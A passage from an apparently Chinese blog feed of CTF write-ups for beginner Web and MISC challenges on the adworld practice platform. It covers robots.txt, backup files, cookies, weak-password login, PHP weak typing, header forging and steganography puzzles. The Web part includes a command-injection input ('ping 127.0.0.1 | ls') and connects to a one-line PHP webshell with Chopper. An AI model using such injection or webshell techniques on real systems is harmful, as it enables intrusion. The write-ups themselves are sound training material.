Area-writeup/GET_POST_POST_flag.png"></li><li><p>得到Flag：<code>cyberpeace{338a1ac6573d4ad2bc8e31d0dd3bf8a5}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>GET请求</li><li>POST请求</li></ul><h1 id="003-robots"><a href="#003-robots" class="headerlink" title="003 robots"></a>003 robots</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p><p><strong>0x02 解题思路</strong></p><p>​        Robots协议已称为爬虫协议，其为一个.txt文本文件，其中包含允许或不允许被爬取的<strong>路径信息</strong>。</p><ul><li>Robots.txt</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/Robots_Access_URL.png"></li><li><p>访问网站的<code>Robots.txt</code>文件</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/Robots_Access_robots.png"></li><li><p>访问<code>f1ag_1s_h3re.php</code>文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/Robots_Access_flag_1s_h3re.png"></li><li><p>得到Flag：<code>cyberpeace{968c1cbae71fdb09c7e4fdcbfa02d80e}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>网络爬虫（Robots协议）</li></ul><h1 id="004-backup"><a href="#004-backup" class="headerlink" title="004 backup"></a>004 backup</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p><p><strong>0x02 解题思路</strong></p><p>​        文件备份后常常会使用到一些特殊的后缀来标识备份文件，常见的备份后缀有：<code>.git .svn .swp .~ .bak .bash_history</code></p><ul><li>尝试可能的备份文件</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/backup_Access_URL.png"></li><li><p>尝试访问并下载<code>index.php.bak</code>文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/backup_index_bak.png"></li><li><p>查看<code>index.php.bak</code>文件内容。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/backup_view_index_bak.png"></li><li><p>得到Flag：<code>Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>文件备份</li></ul><h1 id="005-cookie"><a href="#005-cookie" class="headerlink" title="005 cookie"></a>005 cookie</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p><p><strong>0x02 解题思路</strong></p><p>​        Cookie存储于客户端，可存储信息，用于和服务器交换信息。</p><ul><li>代理抓包</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>Burp</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/cookie_access_url.png"></li><li><p>Burp代理抓包。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/cookie_burp_set-cookie.png"></li><li><p>尝试访问<code>cookie.php</code>文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/cookie_access_cookie.png"></li><li><p>得到Flag：<code>cyberpeace{e1c5b9d2db4504fd3be286ed72b3b494}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>Cookie的作用</li></ul><h1 id="006-disabled-button"><a href="#006-disabled-button" class="headerlink" title="006 disabled_button"></a>006 disabled_button</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><p><strong>0x02 解题思路</strong></p><p>​        前端中的标签不能被点击说明对其属性进行了设置使其不可被点击。</p><ul><li>修改属性</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/disabled_button_access_url.png"></li><li><p><code>F12</code>查看源码，并修改button标签的属性。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/disabled_button_view_source.png"></li><li><p>删掉<code>disabled</code>属性，并点击按钮。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/disabled_button_del_disabled_click_button.png"></li><li><p>得到Flag：<code>cyberpeace{78d1de37514b1958977c5b97e393d808}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>标签属性</li></ul><h1 id="007-weak-auth"><a href="#007-weak-auth" class="headerlink" title="007 weak_auth"></a>007 weak_auth</h1><p><strong>0x01 题目描述</strong></p><p>​        小宁写了一个登陆验证页面，随手就设了一个密码。</p><p><strong>0x02 解题思路</strong></p><p>​        爆破</p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>Burp</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/weak_auth_access_url.png"></li><li><p>尝试常见的<code>username</code>和<code>passwrd</code>。<code>(admin 123456)</code></p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/weak_auth_flag.png"></li><li><p>得到Flag：<code>cyberpeace{b62d4594797dd74c1ae5de94588f472c}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>弱密码爆破</li></ul><h1 id="008-command-execution"><a href="#008-command-execution" class="headerlink" title="008 command_execution"></a>008 command_execution</h1><p><strong>0x01 题目描述</strong></p><p>​        小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p><p><strong>0x02 解题思路</strong></p><p>​        可能存在命令执行漏洞，尝试可执行的命令，查看flag可能存在的位置。</p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/com_exe_access_url.png"></li><li><p>在利用命令执行漏洞是需要先知道目标系统类型，此类型使用index大小写，起送检测出目标系统为Linux/Unix系统。尝试常用命令<code>ping 127.0.0.1 | ls</code>。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/com_exe_ping_ls.png"></li><li><p>尝试搜索<code>flag</code>文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/com_exe_ping_find.png"></li><li><p>查看<code>flag.txt</code>文件内容</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/com_exe_ping_cat_flag.png"></li><li><p>得到Flag：<code>cyberpeace{b93c037a4921fd7bd217f8007a6ac142}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>命令执行漏洞</li><li>常用操作系统命令（Windows/Linux）</li></ul><h1 id="009-simple-php"><a href="#009-simple-php" class="headerlink" title="009 simple_php"></a>009 simple_php</h1><p><strong>0x01 题目描述</strong></p><p>​        小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p><p><strong>0x02 解题思路</strong></p><p>​        </p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>Burp</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_php_access_url.png"></li><li><p>php中弱类型中比较（隐式转换）。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_php_analy_source.png"></li><li><p>GET请求，参数<code>a=a&amp;b=2222a</code></p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_php_GET.png"></li><li><p>得到Flag：<code>Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>PHP弱类型比较</li><li>GET请求</li></ul><h1 id="010-xff-referer"><a href="#010-xff-referer" class="headerlink" title="010 xff_referer"></a>010 xff_referer</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师告诉小宁其实xff和referer是可以伪造的。</p><p><strong>0x02 解题思路</strong></p><p>​        X-Forwarded-For和Referer都可以通过代理抓包进行伪造。</p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>Burp</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/xff_referer_access_url.png"></li><li><p>伪造<code>X-Forwarded-For</code>。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/xff_referer_xff.png"></li><li><p>伪造<code>Referer</code>。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/xff_referer_referer.png"></li><li><p>得到Flag：<code>cyberpeace{600d30fa8835ec5b942e6b29bbe39d24}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>X_Forwarded_For</li><li>Referer</li></ul><h1 id="011-webshell"><a href="#011-webshell" class="headerlink" title="011 webshell"></a>011 webshell</h1><p><strong>0x01 题目描述</strong></p><p>​        小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p><p><strong>0x02 解题思路</strong></p><p>​        一句话木马。</p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>菜刀</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/webshell_access_url.png"></li><li><p>菜刀连接一句话木马。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/webshell_connect_caidao.png"></li><li><p>查看flag文件内容。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/webshell_view_flag.png"></li><li><p>得到Flag：<code>cyberpeace{7f876ecb67df04bc8d6471b3834504c8}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>一句话木马</li><li>菜刀</li><li>webshell</li></ul><h1 id="012-simple-js"><a href="#012-simple-js" class="headerlink" title="012 simple_js"></a>012 simple_js</h1><p><strong>0x01 题目描述</strong></p><p>​        小宁发现了一个网页，但却一直输不对密码。<code>(Flag格式为 Cyberpeace{xxxxxxxxx} )</code></p><p><strong>0x02 解题思路</strong></p><p>​        查看源码中js代码。</p><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_JS_access_url.png"></li><li><p>查看网页源码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_JS_view_source.png"></li><li><p>分析JS代码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_JS_analy_JS.png"></li><li><p>python输出</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_JS_python-print.png"></li><li><p>ASCII转义</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_JS_Decode_ASCII.png"></li><li><p>组合得到Flag：<code>Cyberpeace{786OsErtk12}</code></p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>JS</li><li>Hex -&gt; Dec</li><li>Dec -&gt; ASCII</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界新手区MISC-writeup</title>
      <link href="/2020/09/28/gong-fang-shi-jie-xin-shou-qu-misc-writeup/"/>
      <url>/2020/09/28/gong-fang-shi-jie-xin-shou-qu-misc-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="001-this-is-flag"><a href="#001-this-is-flag" class="headerlink" title="001 this_is_flag"></a>001 this_is_flag</h1><p><strong>0x01 题目描述：</strong></p><p>​        Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p><p><strong>0x02 解题工具：</strong></p><p>​        无</p><p><strong>0x03 解题过程：</strong></p><ol><li>Flag：<code>flag{th1s_!s_a_d4m0_4la9}</code></li></ol><p><strong>0x04 考察知识：</strong></p><p>​        无</p><h1 id="002-pdf"><a href="#002-pdf" class="headerlink" title="002 pdf"></a>002 pdf</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜猫给了菜狗一张图，说图下面什么都没有</p><p><strong>0x02 解题工具：</strong></p><ul><li>FoxitPhantomPDF</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>移开图片发现下面的flag信息。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misc-pdf.png"></li><li><p>得到Flag：<code>flag{security_through_obscurity}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><p>​        无</p><h1 id="003-gif"><a href="#003-gif" class="headerlink" title="003 gif"></a>003 gif</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机</p><p><strong>0x02 解题工具：</strong></p><ul><li>字符信息与二进制</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件信息。</p></li><li><p>打开下载的附件看到黑或白的图片。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/gif_imags.png"></li><li><p>猜测可以转化为二进制（白：0；黑：1），转码得</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/gif_flag.png"></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>二进制</li><li>ASCII编码</li></ul><h1 id="004-掀桌子"><a href="#004-掀桌子" class="headerlink" title="004 掀桌子"></a>004 掀桌子</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗截获了一份报文如下<code>c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2</code>，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻</p><p><strong>0x02 解题工具：</strong></p><p>​        无</p><p><strong>0x03 解题过程：</strong></p><ol><li><p>给定字符串可能为十六进制表示的ASCII，但是转换后超过128，减128得到flag。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/give_you_flag_poc.png"></li><li><p>得到Flag：<code>flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>简单编码</li><li>编程</li></ul><h1 id="005-如来十三掌"><a href="#005-如来十三掌" class="headerlink" title="005 如来十三掌"></a>005 如来十三掌</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗为了打败菜猫，学了一套如来十三掌。</p><p><strong>0x02 解题工具：</strong></p><ul><li>CTFCreakTools</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件并打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/如来十三掌_access.png"></li><li><p>复制文本在<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a>网站进行解码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/如来十三掌_Decode_与佛论禅.png"></li><li><p>将解码的结果再使用ROT13解码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/如来十三掌_Decode_Rot13.png"></li><li><p>将解码的结果再使用Base64解码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/如来十三掌_Decode_Base64.png"></li><li><p>得到Flag：<code>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>佛曰加密</li><li>Rot13</li><li>Base64</li></ul><h1 id="006-give-you-flag"><a href="#006-give-you-flag" class="headerlink" title="006 give_you_flag"></a>006 give_you_flag</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p><p><strong>0x02 解题工具：</strong></p><ul><li>Stegsolve.jar</li><li>PS</li><li>CQR</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件并打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/give_you_flag_access_url.png"></li><li><p>使用Stegsolve工具进行<code>Frame Browser</code>分析，在50帧发现一个残缺二维码。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/残缺二维码.png" alt="残缺二维码"></center></li><li><p>使用工具对二维码进行补全。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/give_you_flag_QC.png"></li><li><p>CQR扫描二维码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/give_you_flag_QR_Reaserch.png"></li><li><p>得到Flag：<code>flag{e7d478cf6b915f50ab1277f78502a2c5}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>隐写术</li><li>GIF图像</li><li>QR</li></ul><h1 id="007-SimpleRAR"><a href="#007-SimpleRAR" class="headerlink" title="007 SimpleRAR"></a>007 SimpleRAR</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)</p><p><strong>0x02 解题工具：</strong></p><ul><li>WinRAR</li><li>WinHex</li><li>StegSolve.Jar</li><li>PS</li><li>QR-Research</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件并尝试打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_access.png"></li><li><p>WinHex打开RAR文件并修复RAR文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_winhex_repair.png"></li><li><p>使用WinHex打开并修改secret.png文件后缀为gif。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simple_winhex_secret.png"></li><li><p>使用StegSolve.Jar打开secret.gif文件，发现存有一半二维码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_stegsolve_secret.png"></li><li><p>使用PS打开secret.gif文件发现有两个图层，分别将两个图层保存，后并使用StegSolve.Jar打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_ps_secret.png"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_stegsolve_coverage.png"></li><li><p>使用PS将二维码进行拼接和修复。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_repair_QR.png"></li><li><p>使用QR-Research扫描二维码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/simplerar_QRSearch_QR.png"></li><li><p>得到Flag：<code>flag{yanji4n_bu_we1shi}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>常见文件头信息</li><li>图像隐写</li><li>图像处理</li><li>QR</li></ul><h1 id="008-坚持60s"><a href="#008-坚持60s" class="headerlink" title="008 坚持60s"></a>008 坚持60s</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗发现最近菜猫不爱理他，反而迷上了菜鸡</p><p><strong>0x02 解题工具：</strong></p><ul><li>Luyten</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件文件并尝试打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/steep60s_access.png"></li><li><p>使用<code>Luyten</code>反编译文件，查找与flag有关的信息。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/steep60s_Luyten_flag.png"></li><li><p>尝试提交该flag，但是显示失败，对flag加进行base64解码，得到真正的flag。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/steep60s_Decode_base64.png"></li><li><p>得到Flag：<code>flag{DajiDali_JinwanChiji}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>Java反编译</li></ul><h1 id="009-base64stego"><a href="#009-base64stego" class="headerlink" title="009 base64stego"></a>009 base64stego</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓</p><p><strong>0x02 解题工具：</strong></p><ul><li>winhex</li><li>python</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件并尝试打开，但是发现被加密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/base64stoge_access.png"></li><li><p>使用WinHex打开发现zip文件是伪加密，修改参数再次尝试打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/base64stoge_winhex_zip_nen.png"></li><li><p>打开stoge.txt文件，发现里面是为base64加密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/base64stoge_winrar_stoge.png"></li><li><p>使用如下poc对base64stoge进行解密。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! python2</span><span class="token comment" spellcheck="true"># base64stogeDecode.py - A poc.</span><span class="token keyword">import</span> base64b64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'stego.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    bin_str <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        stegb64 <span class="token operator">=</span> str<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        rowb64 <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>stegb64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        offset <span class="token operator">=</span> abs<span class="token punctuation">(</span>b64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>stegb64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> b64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>rowb64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        equalnum <span class="token operator">=</span> stegb64<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># no equalnum no offset</span>        <span class="token keyword">if</span> equalnum<span class="token punctuation">:</span>            bin_str <span class="token operator">+=</span> bin<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>equalnum <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/base64stoge_python_poc_flag.png"></li><li><p>得到Flag：<code>flag{Base_sixty_four_point_five}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>zip伪加密</li><li>python</li><li>base64stoge</li></ul><h1 id="010-ext3"><a href="#010-ext3" class="headerlink" title="010 ext3"></a>010 ext3</h1><p><strong>0x01 题目描述：</strong></p><p>​        今天是菜狗的生日，他收到了一个linux系统光盘</p><p><strong>0x02 解题工具：</strong></p><ul><li>360解压</li><li>base64解密</li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件ext3文件，尝试用360解压打开，发现可以打开，搜索flag相关信息。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/ext3_360yan_access.png"></li><li><p>使用加密解密小玩具进行base64解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/ext3_flag.png"></li><li><p>得到Flag：<code>flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>文件提取</li><li>base64解密</li></ul><h1 id="011-stegano"><a href="#011-stegano" class="headerlink" title="011 stegano"></a>011 stegano</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写</p><p><strong>0x02 解题工具：</strong></p><ul><li><p>Foxit PDF</p></li><li><p>CTFCreakTools</p></li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附加并尝试打开。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/stego_access_pdf.png"></li><li><p>文件隐蔽处有一组字母。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/stego_secret_char.png"></li><li><p>因为字符只有A和B，其中还存在无序的间隔，尝试转换为摩斯密码进行解密。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/stego_poc_flag.png"></li><li><p>得到Flag：<code>flag{1nv151bl3m3554g3}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>隐写术</li><li>摩斯密码</li></ul><h1 id="012-功夫再高也怕菜刀"><a href="#012-功夫再高也怕菜刀" class="headerlink" title="012 功夫再高也怕菜刀"></a>012 功夫再高也怕菜刀</h1><p><strong>0x01 题目描述：</strong></p><p>​        菜狗决定用菜刀和菜鸡决一死战</p><p><strong>0x02 解题工具：</strong></p><ul><li><p>foremost</p></li><li><p>WinRAR</p></li><li><p>WireShark</p></li><li><p>C32asm</p></li></ul><p><strong>0x03 解题过程：</strong></p><ol><li><p>下载题目附件并尝试打开。</p><img 